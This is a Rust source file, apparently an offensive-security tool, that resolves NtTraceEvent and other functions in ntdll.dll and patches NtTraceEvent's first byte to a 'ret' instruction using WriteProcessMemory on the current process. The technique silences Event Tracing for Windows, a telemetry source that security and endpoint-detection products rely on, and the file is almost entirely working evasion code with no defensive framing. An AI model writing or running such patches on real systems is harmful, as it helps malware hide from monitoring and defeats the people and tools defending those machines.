use std::{arch::asm, ffi::c_void, mem, ptr::null_mut};

use export_resolver::ExportList;
use windows::Win32::{Foundation::GetLastError, System::{Diagnostics::Debug::WriteProcessMemory, Threading::GetCurrentProcess}};

fn main() {
    // Get reference to NtTraceEvent and other Nt functions we want
    let mut exports = ExportList::new();

    match exports.add("ntdll.dll", "NtTraceEvent"){
        Ok(_) => println!("[+] Obtained virtual address of NtTraceEvent"),
        Err(e) => panic!("[-] Error finding address of NtTraceEvent: {e}"),
    }

    match exports.add("ntdll.dll", "NtOpenProcess"){
        Ok(_) => println!("[+] Obtained virtual address of NtOpenProcess"),
        Err(e) => panic!("[-] Error finding address of NtOpenProcess: {e}"),
    }

    match exports.add("ntdll.dll", "NtWriteVirtualMemory"){
        Ok(_) => println!("[+] Obtained virtual address of NtWriteVirtualMemory"),
        Err(e) => panic!("[-] Error finding address of NtWriteVirtualMemory: {e}"),
    }

    let ret_opcode: u8 = 0xC3; // ret opcode for x86

    // retrieve the virtual address of NtTraceEvent
    let nt_trace_addr = match exports.get_function_address("NtTraceEvent") {
        Ok(v) => v as *const c_void,
        Err(e) => panic!("[-] Unable to retrieve address of NtTraceEvent. {e}"),
    };

    // get a handle to the current process
    let handle = unsafe {GetCurrentProcess()};
    println!("[+] Current processs handle: {:?}", handle);

    // set up variables for WriteProcessMemory
    // let ptr_loc = std::ptr::addr_of!(ret_opcode);
    let size = mem::size_of_val(&ret_opcode);
    let mut bytes_written: usize = 0;

    // unsafe { println!("Addr: {:p}, value: {:x}, size: {}.", ptr_loc, *ptr_loc, size) };
    println!("Addr: {:p}, value: {:x}, size: {}.", 
        &ret_opcode as *const u8 as *const c_void, 
        ret_opcode, 
        size);

    // patch the function 
    let res = unsafe {
        WriteProcessMemory(handle, 
            nt_trace_addr,
            &ret_opcode as *const u8 as *const c_void, 
            size, 
            Some(&mut bytes_written as *mut usize),
        )
    };

    // add an interrupt breakpoint 
    // unsafe { asm!("int3") };

    match res {
        Ok(_) => {
            println!("[+] Success data written. Number of bytes: {:?}", bytes_written);
        },
        Err(_) => {
            let e = unsafe { GetLastError() };
            panic!("[-] Error with WriteProcessMemory: {:?}", e);
        },
    }    
}